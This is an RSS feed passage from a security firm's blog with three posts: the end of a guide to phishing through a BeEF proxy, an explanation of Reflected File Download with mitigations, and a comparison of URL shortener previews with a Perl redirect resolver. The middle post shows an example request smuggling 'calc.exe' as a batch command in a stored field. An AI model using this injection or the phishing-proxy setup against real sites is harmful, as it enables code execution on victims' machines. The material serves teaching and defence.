<li>We apply an output filter on all HTML and JavaScript returned by the real web site to allow for the substitutions</li>
<li>We substitute out 3000 towards the end, as from an external perspective BeEF is on the same port as everything else</li>
<li>We substitute out the legitimate domain in any email addresses the real web site may return</li>
</ul>
<p>It should be noted, that a similar approach can be taken to pass requests through to <a title="Metasploit" href="http://www.metasploit.com/">Metasploit</a> and other exploitation frameworks.</p>
<p>This concludes our brief example. If you enjoyed it, feel free to borrow and if you think you or your users might be susceptible, please feel free to <a title="give us a call" href="https://www.portcullis-security.com/company/contact-us/">give us a call</a>.</p>
<p>PS /pcslhook.js and /pcslendpoint.php are our secret sauce, not that we ever call them that.<br />
PPS You should probably use Location &#8220;/ui&#8221; to limit who can access the BeEF administration panel.</p>
<p>The post <a href="https://portcullislabs.github.io/blog/blood-in-the-water-phishing-with-beef/">Blood in the water: Phishing with BeEF</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://portcullislabs.github.io/blog/blood-in-the-water-phishing-with-beef/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>You can&#8217;t even trust your own reflection these days&#8230;</title>
		<link>https://portcullislabs.github.io/blog/you-cant-even-trust-your-own-reflection-these-days/</link>
		<comments>https://portcullislabs.github.io/blog/you-cant-even-trust-your-own-reflection-these-days/#comments</comments>
		<pubDate>Wed, 05 Nov 2014 17:37:34 +0000</pubDate>
		<dc:creator><![CDATA[TMB]]></dc:creator>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[analysis]]></category>
		<category><![CDATA[exploit]]></category>
		<category><![CDATA[HTML5]]></category>
		<category><![CDATA[phishing]]></category>
		<category><![CDATA[web]]></category>

		<guid isPermaLink="false">https://portcullislabs.github.io/?p=4794</guid>
		<description><![CDATA[<p>Recently, researchers at Trustwave&#8217;s SpiderLabs spoke at Black Hat Europe on the dangers of simply reflecting data back to the requesting user as part of an HTTP request/response exchange. When you think about it, this stands to reason, after all, it&#8217;s what Cross-site Scripting attacks are born from. What&#8217;s interesting is that the new research [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/blog/you-cant-even-trust-your-own-reflection-these-days/">You can&#8217;t even trust your own reflection these days&#8230;</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>Recently, researchers at Trustwave&#8217;s SpiderLabs spoke at Black Hat Europe on the dangers of simply reflecting data back to the requesting user as part of an HTTP request/response exchange. When you think about it, this stands to reason, after all, it&#8217;s what Cross-site Scripting attacks are born from. What&#8217;s interesting is that the new research discussed another way in which it could be exploited.<span id="more-4794"></span></p>
<p>The basic premise of the attack (as described on SpiderLabs&#8217;s <a title="Reflected File Download whitepaper" href="http://blog.spiderlabs.com/2014/10/reflected-file-download-the-white-paper.html">Reflected File Download whitepaper</a>) is as follows:</p>
<ol>
<li>The user follows a malicious link to a trusted web site</li>
<li>An executable file is downloaded and saved on the user’s machine. All security indicators show that the file was hosted on the trusted web site</li>
<li>The user executes the file which contains shell commands that gain complete control over the computer</li>
</ol>
<p>So how does it work? On a recent engagement, <a title="AMM" href="https://portcullislabs.github.io/author/amm/">one of our consultants</a> found a similar issue. In their case, it was a stored variant of the issue SpiderLabs describe but in other regards, it was identical. The consultant discovered that the application they were testing used two APIs that allowed for the storage and retrieval of data, like so:</p>
<pre class="brush: plain; gutter: false; title: ; notranslate">
POST /putData HTTP/1.0
...
{&quot;id&quot;:12345, &quot;input&quot;:&quot;asdf||calc.exe||pause&quot;}
</pre>
<p>This data could then be retrieved using the following URL:</p>
<ul>
<li>http://URL/getData/12345;1.bat</li>
</ul>
<p>Requesting this in a browser results in the browser believing that the user has downloaded what appeared to be a batch file called 12345;1.bat. If the user executes this file, then calc.exe (part of our original input) will be executed.</p>
<p>As with other similar attacks, which exploit variances in how user controlled data is treated by different components of a solution (in this case, the browser and the server), once you know what to watch out for, it&#8217;s fairly easy to mitigate.</p>
<p>Specifically:</p>
<ul>
<li>Validate all user input</li>
<li>Sanitise by means of context sensitive encoding/escaping any user input that remains</li>
<li>Avoid wildcard mappings such as /getdata/* on exposed web services</li>
<li>Ensure that you&#8217;re correctly setting the important HTTP headers such as Content-Type and Content-Disposition (and other related headers such as X-Content-Type-Options) so that direct requests for the URL cause the file to be downloaded</li>
</ul>
<p>This last point is particularly important, browsers will often attempt to automatically render downloaded content using whatever application is rendered for the target file type. Sending a Content-Disposition header of:</p>
<pre class="brush: plain; gutter: false; title: ; notranslate">
attachment; filename=1.txt
</pre>
<p>precludes this, as no matter whether it is saved or opened, it will be treated as text, a <a title="relatively safe" href="http://comments.gmane.org/gmane.comp.security.oss.general/14512">relatively safe</a> file type.</p>
<p>All in all, a nice catch and one we&#8217;ll definitely use in our red team engagements.</p>
<p>The post <a href="https://portcullislabs.github.io/blog/you-cant-even-trust-your-own-reflection-these-days/">You can&#8217;t even trust your own reflection these days&#8230;</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://portcullislabs.github.io/blog/you-cant-even-trust-your-own-reflection-these-days/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
		<item>
		<title>URL shorteners: What link are you really clicking?</title>
		<link>https://portcullislabs.github.io/blog/url-shorteners-what-link-are-you-really-clicking/</link>
		<comments>https://portcullislabs.github.io/blog/url-shorteners-what-link-are-you-really-clicking/#comments</comments>
		<pubDate>Wed, 08 Jan 2014 06:40:41 +0000</pubDate>
		<dc:creator><![CDATA[SWB]]></dc:creator>
				<category><![CDATA[Blog]]></category>
		<category><![CDATA[analysis]]></category>
		<category><![CDATA[phishing]]></category>
		<category><![CDATA[web]]></category>

		<guid isPermaLink="false">https://portcullislabs.github.io/?p=2705</guid>
		<description><![CDATA[<p>URL shorteners are a main-stay of Internet use these days, helping users to cut down unsightly long URLs to concise links that can be easily shared. Social media has helped to fuel the popularity of the various services available, but how do you know if you can trust the link you&#8217;re clicking? I&#8217;ve always been [&#8230;]</p><p>The post <a href="https://portcullislabs.github.io/blog/url-shorteners-what-link-are-you-really-clicking/">URL shorteners: What link are you really clicking?</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></description>
				<content:encoded><![CDATA[<p>URL shorteners are a main-stay of Internet use these days, helping users to cut down unsightly long URLs to concise links that can be easily shared. Social media has helped to fuel the popularity of the various services available, but how do you know if you can trust the link you&#8217;re clicking? I&#8217;ve always been wary of shortened links and decided I&#8217;d take a look at how you can check what it is you&#8217;re actually clicking on.<span id="more-2705"></span></p>
<p>It&#8217;s worth noting that there are numerous browser extensions that will attempt to lengthen short URLs in-situ. While this is probably works well most of the time, it could be open to exploitation (if the extension is coded badly) or subversion. One piece of functionality I&#8217;ve seen in such an extension was to replace the link with the meta data title for the page. This doesn&#8217;t really help if the link leads you to a convincing looking phishing site, complete with fake meta-data.</p>
<p>I&#8217;ve picked out a sample of what seem to be the most popular shortening services. They are (in no particular order):</p>
<ul>
<li>bit.ly</li>
<li>tinyurl.com</li>
<li>goo.gl</li>
<li>is.gd</li>
<li>tiny.cc</li>
<li>ow.ly</li>
</ul>
<p>I&#8217;ve come up with this list as a result of a quick search and those I&#8217;ve had previous experience with. There are a couple of notable exclusions from the list such as t.co and fb.me, the services run by Twitter and Facebook respectively. I&#8217;ve excluded these (as well as others) as they&#8217;re only used by themselves.</p>
<p>Twitter&#8217;s shortener, t.co, is only accessible when using twitter it seems and doesn&#8217;t provide any kind of dedicated front-end to view information for a given link. It does however replace some of the text in-line and provides the original URL in the link title which you can see by hovering over the URL.<br />
Facebook&#8217;s version seems a little&#8230; undocumented. I couldn&#8217;t find a great deal of information on it other than it seems to be used largely for mobile users and (from what little I checked) is only used for linking back to Facebook. One feature I did find however was that it can be used to link to any Facebook page given its alias. For example, <a title="http://fb.me/PortcullisCSL" href="http://fb.me/PortcullisCSL">fb.me/PortcullisCSL</a>.</p>
<p>I&#8217;ve also only chosen services which are free to use and for obvious reasons I&#8217;m excluding any that you can create using your own domain (Coke has one for example &#8211; cokeurl.com).</p>
<p>For this post, we&#8217;re going to use https://portcullislabs.github.io as our long URL to put through the shorteners.</p>
<p>Here&#8217;s a list of how our shortened links come out and the associated ways of previewing the actual destination:</p>
<table>
<tbody>
<tr>
<td>Service</td>
<td>Short link</td>
<td>Preview link</td>
</tr>
<tr>
<td>bit.ly</td>
<td><a title="http://bit.ly/2cx5kA" href="http://bit.ly/2cx5kA">http://bit.ly/2cx5kA</a></td>
<td><a title="http://bit.ly/2cx5kA+" href="http://bit.ly/2cx5kA+">http://bit.ly/2cx5kA+</a></td>
</tr>
<tr>
<td>tinyurl.com</td>
<td><a title="http://tinyurl.com/nt79ln4" href="http://tinyurl.com/nt79ln4">http://tinyurl.com/nt79ln4</a></td>
<td><a title="http://preview.tinyurl.com/nt79ln4" href="http://preview.tinyurl.com/nt79ln4">http://preview.tinyurl.com/nt79ln4</a></td>
</tr>
<tr>
<td>goo.gl</td>
<td><a title="http://goo.gl/cgc0Wb" href="http://goo.gl/cgc0Wb">http://goo.gl/cgc0Wb</a></td>
<td><a title="http://goo.gl/#analytics/goo.gl/cgc0Wb/all_time" href="http://goo.gl/#analytics/goo.gl/cgc0Wb/all_time">http://goo.gl/#analytics/goo.gl/cgc0Wb/all_time</a></td>
</tr>
<tr>
<td>is.gd</td>
<td><a title="http://is.gd/ObGfiX" href="http://is.gd/ObGfiX">http://is.gd/ObGfiX</a></td>
<td><a title="http://is.gd/ObGfiX-" href="http://is.gd/ObGfiX-">http://is.gd/ObGfiX-</a></td>
</tr>
<tr>
<td>tiny.cc</td>
<td><a title="http://tiny.cc/43z67w" href="http://tiny.cc/43z67w">http://tiny.cc/43z67w</a></td>
<td><a title="http://tiny.cc/43z67w~" href="http://tiny.cc/43z67w~">http://tiny.cc/43z67w~</a></td>
</tr>
<tr>
<td>ow.ly</td>
<td><a title="http://ow.ly/rObWZ" href="http://ow.ly/rObWZ">http://ow.ly/rObWZ</a></td>
<td>Couldn&#8217;t find a way to expand the URL.</td>
</tr>
</tbody>
</table>
<p>In summary; bit.ly, is.gd and tiny.cc all have nice simple ways of taking a look, you just have to add a character onto the end (providing you pick the right one). Google&#8217;s service seems like the most complicated requiring the knowledge of the correct runes, and I couldn&#8217;t find a way to preview ow.ly.</p>
<p>When writing this post, I was pointed at a bit of quick Perl that <a title="Tim" href="/author/tmb/">Tim</a> wrote a little while ago to assist in a test which will follow a short link and print out each redirect it encounters along the way. This is particularly useful if your chosen link leads you to yet another URL shortener service.</p>
<pre class="brush: perl; title: ; notranslate">
#!/usr/bin/perl

use strict;
use LWP;

my $url;
my $redirectflag;
my $httphandle;
my $requesthandle;
my $responsehandle;

sub usage {
        die &quot;usage: &quot; . basename($0) . &quot; &quot;;
}

if (@ARGV != 1) {
        usage();
}
$url = shift;
$httphandle = LWP::UserAgent-&gt;new(max_redirect =&gt; 0);
$httphandle-&gt;agent(&quot;Mozilla/5.0 (compatible; resolveurl.pl 0.1)&quot;);
$redirectflag = 1;
while ($redirectflag == 1) {
        $redirectflag = 0;
        $requesthandle = HTTP::Request-&gt;new(HEAD =&gt; $url);
        $responsehandle = $httphandle-&gt;request($requesthandle);
        if ($responsehandle-&gt;is_redirect) {
                $url = $responsehandle-&gt;header(&quot;location&quot;);
                print $url . &quot;\n&quot;;
                $redirectflag = 1;
        }
}
</pre>
<p>Lastly, I&#8217;ve decided to make a quick mention of adf.ly which was pointed out to me by a colleague. This is a service for presenting ads before sending users onto the end URL. From a quick look, there didn&#8217;t appear any way in which to preview the URL you were being sent to. Given that following one of their links will present you with a third party ad could have its own implications. But that&#8217;s for another post.</p>
<p>The post <a href="https://portcullislabs.github.io/blog/url-shorteners-what-link-are-you-really-clicking/">URL shorteners: What link are you really clicking?</a> appeared first on <a href="https://portcullislabs.github.io">Portcullis Labs</a>.</p>]]></content:encoded>
			<wfw:commentRss>https://portcullislabs.github.io/blog/url-shorteners-what-link-are-you-really-clicking/feed/</wfw:commentRss>
		<slash:comments>0</slash:comments>
		</item>
	</channel>
</rss>
